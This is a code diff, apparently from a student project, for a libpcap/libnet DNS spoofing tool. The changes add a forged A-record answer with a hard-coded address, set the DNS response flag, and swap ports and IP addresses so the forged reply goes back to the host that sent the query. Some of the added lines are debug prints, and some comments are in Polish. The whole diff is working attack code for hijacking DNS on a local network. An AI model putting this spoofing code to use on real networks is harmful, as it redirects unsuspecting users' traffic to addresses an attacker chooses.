@@ -69,12 +69,12 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
     auto incoming_dns_header = (unsigned char *)(bytes + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct libnet_udp_hdr));
 
     printf("========= DNS =========\n");
-//    printf("Transaction ID: 0x%04x\n", dns_qid(dns));
-//    printf("Questions: %i\n", dns_numqd(dns));
-//    printf("Answer RRs: %i\n", dns_numan(dns));
-//    printf("Authority RRs: %i\n", dns_numns(dns));
-//    printf("Additional RRs: %i\n", dns_numar(dns));
-//    printf("response/request 0x%02x\n", dns_qr(dns));
+    printf("Transaction ID: 0x%04x\n", dns_qid(incoming_dns_header));
+    printf("Questions: %i\n", dns_numqd(incoming_dns_header));
+    printf("Answer RRs: %i\n", dns_numan(incoming_dns_header));
+    printf("Authority RRs: %i\n", dns_numns(incoming_dns_header));
+    printf("Additional RRs: %i\n", dns_numar(incoming_dns_header));
+    printf("response/request 0x%02x\n", dns_qr(incoming_dns_header));
 
 
     cout << (dns_qr(incoming_dns_header ) > 0 ? "[REQ]" : "[RES]") << " id: 0x"<< std::hex << dns_qid(incoming_dns_header ) << ", query: ";
@@ -83,6 +83,8 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
         cout << segment << ".";
     }
     cout <<  endl;
+
+    cout << std::hex << dns_qr(incoming_dns_header) << endl;
 
     if(dns_qr(incoming_dns_header ) > 0) {
 
@@ -116,13 +118,20 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                         0x00,
                         0x01,
                         0x00,
-                        0x01);
-
+                        0x01,
+                        //answer
+                        0xc0, 0x0c, //idk
+                        0x00, 0x01, // A
+                        0x00, 0x01, // IN
+                        0x00, 0x00, 0x00, 0x11, // 17 time to live: );
+                        0x00, 0x04, //data length 4
+                        0xd5, 0xb4, 0x8d, 0x8c // onet.pl
+                );
 
                 auto tag = libnet_build_dnsv4(
                         LIBNET_UDP_DNSV4_H, //const size of dns header - 12
                         (uint16_t)dns_qid(incoming_dns_header ), // transaction id
-                        (uint16_t)(0 | (1 << 16)), // flags (set only first -> first indicate response)
+                        (uint16_t)(0 | (1 << 15)), // flags (set only first -> first indicate response)
                         1 /*dns_numqd(dns)*/, // question number
                         0 /*dns_numan(dns)*/, // answer RR number
                         0, // auth RR number
@@ -136,10 +145,12 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                     cout << "dns error: " << libnet_geterror(libnet_context) << endl;
                 }
 
+                cout << (uint32_t)incoming_udp_header->uh_dport << endl;
+                cout << (uint32_t)incoming_udp_header->uh_sport << endl;
 
                 tag = libnet_build_udp(
-                        incoming_udp_header->uh_dport, // source port
-                        incoming_udp_header->uh_sport, // destination port
+                        ntohs(incoming_udp_header->uh_sport), // source port 53
+                        ntohs(incoming_udp_header->uh_dport), // destination port
                         (uint16_t)(LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + payload_s), // length
                         0, // checksum
                         nullptr, // payload,
@@ -151,6 +162,9 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                     cout << "udp error: " << libnet_geterror(libnet_context) << endl;
                 }
 
+                cout << incoming_ip_header->daddr << endl; //192.168.0.11
+                cout << incoming_ip_header->saddr << endl; //62.21.99.94
+
                 tag = libnet_build_ipv4 (
                         (uint16_t)(LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + payload_s),	// length
                         (uint8_t)incoming_ip_header->tos, // tos NIE WIEM XD
@@ -159,8 +173,8 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                         (uint8_t)incoming_ip_header->ttl, // time to live
                         IPPROTO_UDP, // upper layer protocol
                         0, // checksum
-                        incoming_ip_header->daddr,		//Src IP
                         incoming_ip_header->saddr,		//Dst IP
+                        incoming_ip_header->daddr,		//Src IP //192.168.0.11
                         nullptr, // payload
                         0, // payload size
                         libnet_context,
@@ -169,6 +183,8 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                 if(tag == -1){
                     cout << "ipv4 error: " << libnet_geterror(libnet_context) << endl;
                 }
+
+
 
                 tag = libnet_autobuild_ethernet(
                         incoming_ethernet_header->h_source,
@@ -180,13 +196,11 @@ void handle_dns_packet(u_char *user, const struct pcap_pkthdr *h, const u_char *
                 }
 
 
-
-                if(libnet_write(libnet_context) == -1){
+                if(libnet_write(libnet_context) == -1) {
                     printf("write error: %s\n", libnet_geterror(libnet_context));
                 }
 
                 libnet_clear_packet(libnet_context);
-                libnet_destroy(libnet_context); // maybe not necessary
             }
         }
 
